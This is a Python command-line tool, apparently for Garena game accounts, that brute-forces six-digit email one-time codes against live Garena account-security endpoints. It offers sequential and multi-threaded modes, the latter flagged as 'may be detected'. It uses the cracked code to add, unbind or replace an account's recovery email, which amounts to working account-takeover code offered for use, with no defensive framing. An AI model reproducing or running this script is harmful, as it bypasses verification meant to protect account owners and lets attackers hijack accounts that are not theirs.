import requests
from os import system
import itertools
import time

# Add this new function for brute force verification
def brute_force_security_code(email, access_token, headers):
    print("\n[Brute Force] Starting security code verification...")
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    
    # Try all possible 6-digit codes from 000000 to 999999
    for code in itertools.product('0123456789', repeat=6):
        code_str = ''.join(code)
        print(f"Trying code: {code_str}")
        
        data = {
            'email': email,
            'app_id': '100067',
            'access_token': access_token,
            'otp': code_str
        }
        
        try:
            resp = requests.post(url, headers=headers, data=data, timeout=30)
            resp.raise_for_status()
            result = resp.json()
            
            if result.get("result") == 0:
                print(f"✓ SUCCESS: Found correct code: {code_str}")
                return result.get("verifier_token")
        except Exception as e:
            print(f"✗ Error with code {code_str}: {str(e)}")
            continue
    
    print("✗ FAILED: Could not find correct security code")
    return None

# Modify your existing functions to use brute force when needed

# Update the SEnd function to use brute force instead of manual input
def SEnd(email, access):
    UrL = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    PyL = {'app_id': "100067", 'access_token': access, 'email': email, 'locale': "en_MA"}
    Hr = {'User-Agent': "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)", 'Connection': "Keep-Alive", 'Accept': "application/json", 'Accept-Encoding': "gzip"}
    RsP = requests.post(UrL, data=PyL, headers=Hr)
    if RsP.status_code == 200:
        print('- OTP sent, starting brute force verification...')
        return brute_force_security_code(email, access, Hr)
    else:
        print('- Bad Response No OTP Get!')

# Update the unbind_email function to use brute force for OTP verification
def unbind_email():
    system('clear')
    print("----- UNBIND EMAIL -----")
    print("1. By Email OTP (with Brute Force)")
    print("2. By Secondary Password")

    choice = input("\nSelect Option: ")

    headers = {
        "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }

    email = input('- Enter Linked Email: ').strip()
    access_token = input('- Enter Access Token: ').strip()

    identity_token = None

    if choice == '1':
        print("\n[Step 1] Sending OTP...")

        send_otp_url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"

        send_otp_data = {
            "email": email,
            "locale": "en_MA",
            "region": "IND",
            "app_id": "100067",
            "access_token": access_token
        }

        try:
            resp = requests.post(send_otp_url, headers=headers, data=send_otp_data, timeout=30)
            resp.raise_for_status()
            
            if resp.status_code == 200 and resp.json().get("result") == 0:
                print("✓ OTP Sent")
            else:
                print(f"✗ OTP Send Failed: {resp.text}")
                return
        except Exception as e:
            print(f"✗ OTP Send Failed: {str(e)}")
            return

        print("\n[Step 2] Brute forcing OTP...")
        identity_token = brute_force_security_code(email, access_token, headers)
        
        if not identity_token:
            print("✗ Failed to get identity_token")
            return

    elif choice == '2':
        secondary_password = input("- Enter Secondary Password: ").strip()

        print("\n[Step 1] Verifying Secondary Password...")

        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"

        verify_data = {
            "email": email,
            "secondary_password": secondary_password,
            "app_id": "100067",
            "access_token": access_token
        }

        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=30)
            resp.raise_for_status()
            result = resp.json()
            
            if result.get("result") == 0:
                identity_token = result.get("identity_token")
                if identity_token:
                    print("✓ Identity Verified")
                else:
                    print("✗ No identity_token in response")
                    return
            else:
                print(f"✗ Verification Failed: {result}")
                return
        except Exception as e:
            print(f"✗ Verification Failed: {str(e)}")
            return

    else:
        print("Invalid Option")
        return

    if not identity_token:
        print("✗ Failed to get identity_token")
        return

    print("\n[Final Step] Creating Unbind Request...")

    unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"

    unbind_data = {
        "app_id": "100067",
        "access_token": access_token,
        "identity_token": identity_token
    }

    try:
        resp = requests.post(unbind_url, headers=headers, data=unbind_data, timeout=30)
        resp.raise_for_status()
        result = resp.json()
        
        if result.get("result") == 0:
            print("\n✓ SUCCESS: Email Unbind Request Created!")
            print(f"Response: {result}")
        else:
            print(f"\n✗ FAILED: {result}")
    except Exception as e:
        print(f"\n✗ FAILED: {str(e)}")

# Update the change_bind_email function to use brute force for OTP verification
def change_bind_email():
    system('clear')
    print("--- CHANGE BIND EMAIL ---")
    print("1. Verify Old Email by OTP (with Brute Force)")
    print("2. Verify by Secondary Password")

    method = input("\nSelect Method: ")

    access = input('- Enter Access Token: ').strip()
    old = input('- Enter Old Email: ').strip()
    new = input('- Enter New Email: ').strip()

    headers = {
        "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }

    identity_token = None

    if method == '1':
        print(f"\n[Step 1/5] Sending OTP to {old}...")
        url_send = "https://100067.connect.garena.com/game/account_security/bind:send_otp"

        data = {
            'email': old,
            'locale': 'en_MA',
            'region': 'IND',
            'app_id': '100067',
            'access_token': access
        }

        try:
            r = requests.post(url_send, headers=headers, data=data, timeout=30)
            if r.json().get("result") != 0:
                print(f"✗ Failed to send OTP: {r.text}")
                return
            print("✓ OTP Sent")
        except Exception as e:
            print(f"✗ Error: {str(e)}")
            return

        print(f"\n[Step 2/5] Brute forcing OTP for {old}...")
        identity_token = brute_force_security_code(old, access, headers)
        
        if not identity_token:
            print("✗ No identity token found.")
            return

    elif method == '2':
        secondary_password = input("- Enter Secondary Password: ").strip()

        print("\n[Step 1/5] Verifying Secondary Password...")

        url_verify_identity = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"

        data_verify = {
            'email': old,
            'secondary_password': secondary_password,
            'app_id': '100067',
            'access_token': access
        }

        try:
            r = requests.post(url_verify_identity, headers=headers, data=data_verify, timeout=30)
            res = r.json()
            if res.get("result") == 0:
                identity_token = res.get("identity_token")
                if not identity_token:
                    print("✗ No identity token found.")
                    return
                print("✓ Identity Verified")
            else:
                print(f"✗ Verification Failed: {res}")
                return
        except Exception as e:
            print(f"✗ Error: {str(e)}")
            return

    else:
        print("Invalid Option")
        return

    print(f"\n[Step 3/5] Sending OTP to {new}...")
    url_send = "https://100067.connect.garena.com/game/account_security/bind:send_otp"

    data_new = {
        'email': new,
        'locale': 'en_MA',
        'region': 'IND',
        'app_id': '100067',
        'access_token': access
    }

    try:
        r = requests.post(url_send, headers=headers, data=data_new, timeout=30)
        if r.json().get("result") != 0:
            print(f"✗ Failed to send OTP: {r.text}")
            return
        print("✓ OTP Sent")
    except Exception as e:
        print(f"✗ Error: {str(e)}")
        return

    print(f"\n[Step 4/5] Brute forcing OTP for {new}...")
    verifier_token = brute_force_security_code(new, access, headers)
    
    if not verifier_token:
        print("✗ No verifier token found.")
        return

    print(f"\n[Step 5/5] Finalizing Rebind Request...")

    url_rebind = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"

    data_final = {
        'identity_token': identity_token,
        'email': new,
        'app_id': '100067',
        'verifier_token': verifier_token,
        'access_token': access
    }

    try:
        r = requests.post(url_rebind, headers=headers, data=data_final, timeout=30)
        result = r.json()
        if result.get("result") == 0:
            print("\n✓ SUCCESS: Rebind Created!")
        else:
            print(f"\n✗ FAILED: {result}")
    except Exception as e:
        print(f"\n✗ FAILED: {str(e)}")

def CancEL(access):
    UrL = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    PyL = {'app_id': "100067", 'access_token': access}
    Hr = {'User-Agent': "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip"}
    RsP = requests.post(UrL, data=PyL, headers=Hr)
    if RsP.status_code == 200:
        print('- Response => ', RsP.json())
    else:
        print('- No Response!')

def VeriFy(OTp, email, access):
    UrL = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    PyL = {'app_id': "100067", 'access_token': access, 'otp': OTp, 'email': email}
    Hr = {'User-Agent': "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip"}
    RsP = requests.post(UrL, data=PyL, headers=Hr)
    if RsP.status_code == 200:
        auth = RsP.json().get("verifier_token")
        print('- Auth Access : ', auth)
        return Add(auth, access, email)
    else:
        print('- Failed to verify OTP')
        return None

def Add(auth, access, email):
    CancEL(access)
    UrL = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
    PyL = {'app_id': "100067", 'access_token': access, 'verifier_token': auth, 'secondary_password': "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203", 'email': email}
    Hr = {'User-Agent': "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip"}
    RsP = requests.post(UrL, data=PyL, headers=Hr)
    if RsP.status_code == 200:
        print(RsP.json())
        print(f'- Successfully Adding : {email} To Account!')
    else:
        print('- Failed to add email')

def ReVoKe(access):
    url = f"https://100067.connect.garena.com/oauth/logout?access_token={access}"
    r = requests.get(url)
    if r.text.strip() == '{"result":0}':
        print("TOKEN REVOKED SUCCESSFULLY 🎉")
    else:
        print("Status:", r.status_code)
        print("Response:", r.text)

def convert(s):
    d, h = divmod(s, 86400)
    h, m = divmod(h, 3600)
    m, s = divmod(m, 60)
    return f"{d} Day {h} Hour {m} Min {s} Sec"

def ChK(access):
    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    payload = {'app_id': "100067", 'access_token': access}
    headers = {'User-Agent': "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip"}
    rsp = requests.get(url, params=payload, headers=headers)
    if rsp.status_code == 200:
        data = rsp.json()
        print(data)
        email = data.get("email", "")
        email_to_be = data.get("email_to_be", "")
        countdown = data.get("request_exec_countdown", 0)
        if email == "" and email_to_be != "":
            print(f"Email : {email_to_be}\nConfirmed in : {convert(countdown)}")
        elif email != "" and email_to_be == "":
            print(f"Email : {email}\nConfirmed : Yes Good!")
        elif email == "" and email_to_be == "":
            print(f"No Email Linked!")
    else:
        print("Error => ", rsp.status_code)

def GeT_PLaFTroms(t):
    system('clear')
    r = requests.get("https://100067.connect.garena.com/bind/app/platform/info/get",
                     params={'access_token': t},
                     headers={'User-Agent': "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"})
    if r.status_code not in [200, 201]:
        print("Failed to fetch.")
        return
    j = r.json()
    m = {3: "Facebook", 8: "Gmail", 10: "iCloud", 5: "VK", 11: "Twitter", 7: "Huawei"}
    b, a = j.get("bounded_accounts", []), j.get("available_platforms", [])
    print("> Secondary Links: <")
    l = False
    for x in b:
        try:
            p = x.get('platform')
            u = x.get('uid')
            uinfo = x.get('user_info', {})
            e = uinfo.get('email', '')
            n = uinfo.get('nickname', '')
            if p in m:
                print(f"\n=> {m[p]} !")
                if e:
                    print(f"- Email : {e}")
                if n:
                    print(f"- Email Name : {n}")
                print()
                l = True
        except:
            continue
    if not l:
        print("=> Secondary Links Not Found!")
    print("\n> Response: <\n\n", b)
    for k in m:
        if k not in a:
            print(f"\n> Main Platform => {m[k]} ! <")
            break

def MenU():
    while True:
        system('clear')
        print("=" * 40)
        print("      Garena Account Tool")
        print("      Developer : @narutocodexff")
        print("=" * 40)
        print('[1] - Add Recovery Email (with Brute Force)')
        print('[2] - Check Recovery Email')
        print('[3] - Check Platform')
        print('[4] - Cancel Recovery Email')
        print('[5] - Unbind Email (with Brute Force)')
        print('[6] - Change Bind Email (with Brute Force)')
        print('[7] - Revoke Access Token')

        sH = input('\nChoose: ')

        if sH == '1':
            system('clear')
            SEnd(input('- Enter Email: '), input('- Enter Access: '))
            input('\nPress Enter to return menu...')

        elif sH == '2':
            system('clear')
            ChK(input('- Enter Access: '))
            input('\nPress Enter to return menu...')

        elif sH == '3':
            system('clear')
            GeT_PLaFTroms(input('- Enter Access: '))
            input('\nPress Enter to return menu...')

        elif sH == '4':
            system('clear')
            CancEL(input('- Enter Access: '))
            input('\nPress Enter to return menu...')

        elif sH == '5':
            system('clear')
            unbind_email()
            input('\nPress Enter to return menu...')

        elif sH == '6':
            system('clear')
            change_bind_email()
            input('\nPress Enter to return menu...')

        elif sH == '7':
            system('clear')
            ReVoKe(input('- Enter Access: '))
            input('\nPress Enter to return menu...')

        else:
            print('Invalid Choice!')
            input('Press Enter...')

# Add a function to optimize the brute force approach with parallel processing
import threading
import queue

def parallel_brute_force(email, access_token, headers, num_threads=10):
    print(f"\n[Parallel Brute Force] Starting with {num_threads} threads...")
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    
    # Create a queue for results
    result_queue = queue.Queue()
    
    # Function for each thread to execute
    def worker(start_code, end_code):
        for code in range(start_code, end_code):
            code_str = f"{code:06d}"  # Format as 6-digit with leading zeros
            print(f"Trying code: {code_str}")
            
            data = {
                'email': email,
                'app_id': '100067',
                'access_token': access_token,
                'otp': code_str
            }
            
            try:
                resp = requests.post(url, headers=headers, data=data, timeout=30)
                resp.raise_for_status()
                result = resp.json()
                
                if result.get("result") == 0:
                    print(f"✓ SUCCESS: Found correct code: {code_str}")
                    result_queue.put(result.get("verifier_token"))
                    return True
            except Exception as e:
                print(f"✗ Error with code {code_str}: {str(e)}")
                continue
        return False
    
    # Calculate the range of codes for each thread
    total_codes = 1000000  # From 000000 to 999999
    codes_per_thread = total_codes // num_threads
    
    # Create and start threads
    threads = []
    for i in range(num_threads):
        start = i * codes_per_thread
        end = (i + 1) * codes_per_thread if i < num_threads - 1 else total_codes
        thread = threading.Thread(target=worker, args=(start, end))
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete or for a result
    while True:
        if not result_queue.empty():
            # Found a result, return it
            return result_queue.get()
        
        # Check if all threads are done
        if all(not thread.is_alive() for thread in threads):
            break
        
        # Small delay to prevent busy waiting
        time.sleep(0.1)
    
    print("✗ FAILED: Could not find correct security code")
    return None

# Add a new function to the menu for choosing between sequential and parallel brute force
def enhanced_brute_force_menu():
    system('clear')
    print("----- BRUTE FORCE VERIFICATION -----")
    print("1. Sequential Brute Force (Slower but more stable)")
    print("2. Parallel Brute Force (Faster but may be detected)")
    
    choice = input("\nSelect Option: ")
    
    email = input('- Enter Email: ').strip()
    access_token = input('- Enter Access Token: ').strip()
    
    headers = {
        "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    
    # Send OTP first
    print("\n[Step 1] Sending OTP...")
    send_otp_url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    send_otp_data = {
        "email": email,
        "locale": "en_MA",
        "region": "IND",
        "app_id": "100067",
        "access_token": access_token
    }
    
    try:
        resp = requests.post(send_otp_url, headers=headers, data=send_otp_data, timeout=30)
        resp.raise_for_status()
        
        if resp.status_code == 200 and resp.json().get("result") == 0:
            print("✓ OTP Sent")
        else:
            print(f"✗ OTP Send Failed: {resp.text}")
            return
    except Exception as e:
        print(f"✗ OTP Send Failed: {str(e)}")
        return
    
    # Then perform apple force based on choice
    if choice == '1':
        print("\n[Step 2] Starting Sequential Brute Force...")
        verifier_token = brute_force_security_code(email, access_token, headers)
    elif choice == '2':
        num_threads = input("Enter number of threads (recommended 5-10): ")
        try:
            num_threads = int(num_threads)
            if num_threads < 1 or num_threads > 50:
                print("Invalid number of threads. Using default 10.")
                num_threads = 10
        except:
            print("Invalid input. Using default 10.")
            num_threads = 10
            
        print(f"\n[Step 2] Starting Parallel Brute Force with {num_threads} threads...")
        verifier_token = parallel_brute_force(email, access_token, headers, num_threads)
    else:
        print("Invalid Option")
        return
    
    if verifier_token:
        print(f"\n✓ SUCCESS: Verification completed with token: {verifier_token}")
    else:
        print("\n✗ FAILED: Verification failed")
    
    input('\nPress Enter to return menu...')

# Update the main menu to include the new option
def MenU():
    while True:
        system('clear')
        print("=" * 40)
        print("      Garena Account Tool")
        print("      Developer : @narutocodexff")
        print("=" * 40)
        print('[1] - Add Recovery Email (with Brute Force)')
        print('[2] - Check Recovery Email')
        print('[3] - Check Platform')
        print('[4] - Cancel Recovery Email')
        print('[5] - Unbind Email (with Brute Force)')
        print('[6] - Change Bind Email (with Brute Force)')
        print('[7] - Revoke Access Token')
        print('[8] - Enhanced Brute Force Verification')

        sH = input('\nChoose: ')

        if sH == '1':
            system('clear')
            SEnd(input('- Enter Email: '), input('- Enter Access: '))
            input('\nPress Enter to return menu...')

        elif sH == '2':
            system('clear')
            ChK(input('- Enter Access: '))
            input('\nPress Enter to return menu...')

        elif sH == '3':
            system('clear')
            GeT_PLaFTroms(input('- Enter Access: '))
            input('\nPress Enter to return menu...')

        elif sH == '4':
            system('clear')
            CancEL(input('- Enter Access: '))
            input('\nPress Enter to return menu...')

        elif sH == '5':
            system('clear')
            unbind_email()
            input('\nPress Enter to return menu...')

        elif sH == '6':
            system('clear')
            change_bind_email()
            input('\nPress Enter to return menu...')

        elif sH == '7':
            system('clear')
            ReVoKe(input('- Enter Access: '))
            input('\nPress Enter to return menu...')
            
        elif sH == '8':
            system('clear')
            enhanced_brute_force_menu()

        else:
            print('Invalid Choice!')
            input('Press Enter...')

# Start the program
if __name__ == "__main__":
    MenU()